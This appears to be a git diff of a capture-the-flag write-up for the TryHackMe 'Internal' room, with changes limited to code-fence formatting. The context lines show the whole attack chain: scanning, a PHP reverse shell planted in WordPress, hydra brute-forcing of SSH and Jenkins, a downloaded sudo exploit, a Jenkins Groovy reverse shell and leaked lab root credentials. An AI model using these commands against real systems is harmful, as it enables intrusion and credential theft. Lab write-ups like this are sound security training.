@@ -6,7 +6,7 @@ These notes are from a challenge I did @[tryhackme](https://tryhackme.com) calle
 
 Let's add internal.thm to the hosts file as requested and run nmap, niktio and gobuster to scan the target.
 
-```sh
+``` sh
 sudo echo 10.10.156.30 internal.thm >> /etc/hosts
 
 IP="10.10.156.30"
@@ -16,7 +16,7 @@ nikto -h $IP
 ```
 
 ??? output "Nmap output"
-    ```sh
+    ``` sh
     nmap -sC -sV $IP
     Nmap scan report for 10.10.156.30
     Host is up (0.020s latency).
@@ -37,7 +37,7 @@ nikto -h $IP
     ```
 
 ??? output "nikto output"
-    ```sh
+    ``` sh
     nikto -h $IP
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -64,7 +64,7 @@ nikto -h $IP
     ```
 
 ??? output "gobuster output"
-    ```txt
+    ``` txt
     gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
     ===============================================================
     /blog                 (Status: 301) [Size: 311] [--> http://10.10.156.30/blog/]
@@ -75,7 +75,7 @@ nikto -h $IP
     ```
 
 ??? output "Wordpress output"
-    ```txt
+    ``` txt
     wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
     _______________________________________________________________
             __          _______   _____
@@ -155,12 +155,12 @@ The wordpress page reveals a private note on credentals of william being william
 
 I used this [php reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php), modified IP and port and uploaded it to the wordpress 404 page. Now time to start netcat on the chosen port e.g. ```nc -lvnp 6666``` and call a page that doesn't exist e.g. ```/blog/index.php/2020/08/03/50/``` with e.g. curl.
 
-We now get a reverse shell but no TTY so we can try this: ```python -c 'import pty; pty.spawn("/bin/sh")'``` or this ```/bin/sh -i```.
+We now get a reverse shell but no TTY so we can try this: ``` python -c 'import pty; pty.spawn("/bin/sh")'``` or this ```/bin/sh -i```.
 
 Let's have a look around:
 
 ??? output "cat /etc/passwd output"
-    ```sh
+    ``` sh
     cat /etc/passwd
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -197,13 +197,13 @@ Let's have a look around:
 
 The /home path shows one user "aubreanna" so let's use this to crack ssh using hydra:
 
-```sh
+``` sh
 hydra -l aubreanna -P rockyou.txt 10.10.156.30 ssh
 ```
 
 In parallel we can look for files containing "aubreanna":
 
-```sh
+``` sh
 find ./ -type f -iname "*.txt" -exec grep -l "aubreanna" {} \; 2>/dev/null
 ./opt/wp-save.txt
 cat wp-save.txt
@@ -220,7 +220,7 @@ So let's login via aubreanna: ```ssh aubreanna@10.10.156.30``` and we find the f
 
 Unfortunately ```sudo -l``` is not allowed
 
-```sh
+``` sh
 aubreanna@internal:~$ sudo -l
 [sudo] password for aubreanna:
 Sorry, user aubreanna may not run sudo on internal.
@@ -232,14 +232,14 @@ Let's try running linpeas on the system to find something interesting:
 
 From the Kali system
 
-```sh
+``` sh
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
 scp linpeas.sh aubreanna@10.10.156.30:~/linpeas.sh
 ```
 
 On the target machine as aubreanna:
 
-```sh
+``` sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
@@ -259,7 +259,7 @@ We also see we have Sudo running in version ```1.8.21``` and a check with search
 
 @Kali
 
-```sh
+``` sh
 wget -O exploit.c https://www.exploit-db.com/raw/42183
 gcc -o exploit exploit.c
 scp exploit aubreanna@10.10.156.30:~/exploit
@@ -267,7 +267,7 @@ scp exploit aubreanna@10.10.156.30:~/exploit
 
 @aubreanna@internal
 
-```sh
+``` sh
 chmod +x exploit
 ./exploit
 died in main: 57
@@ -281,7 +281,7 @@ In the home folder of aubreanna there is txt mentioning a local jenkins server.
 
 From kali lets tunnel local port 31340 with ssh to "127.0.0.1:8080" on internal.thm (which we modified at the beginning).
 
-```sh
+``` sh
 ssh -g -L31340:127.0.0.1:8080 -l aubreanna internal.thm
 ```
 
@@ -291,7 +291,7 @@ We can the open jenkins from your kali machine e.g. http://localhost:31340 and a
 
 Using the information from the intercepted post command of a failed login attempt we can build the hdyra brute-force attack:
 
-```sh
+``` sh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 31340 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:F=Invalid"
 ```
 
@@ -308,7 +308,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 We now have a reverse shell as user jenkins.
 
-```sh
+``` sh
 find / -type f -iname "*.txt" 2>/dev/null
 /opt/note.txt
 /var/jenkins_home/userContent/readme.txt
@@ -329,7 +329,7 @@ find / -type f -iname "*.txt" 2>/dev/null
 
 The list is a little longer but the only interesting text file seems to be the note.
 
-```txt
+``` txt
 cat note.txt
 Aubreanna,
 
@@ -341,7 +341,7 @@ root:tr0ub13guM!@#123
 
 Let ssh as root and see if we find the flag :)
 
-```sh
+``` sh
 ssh root@10.10.156.30
 root@internal:~# cat root.txt
 ```
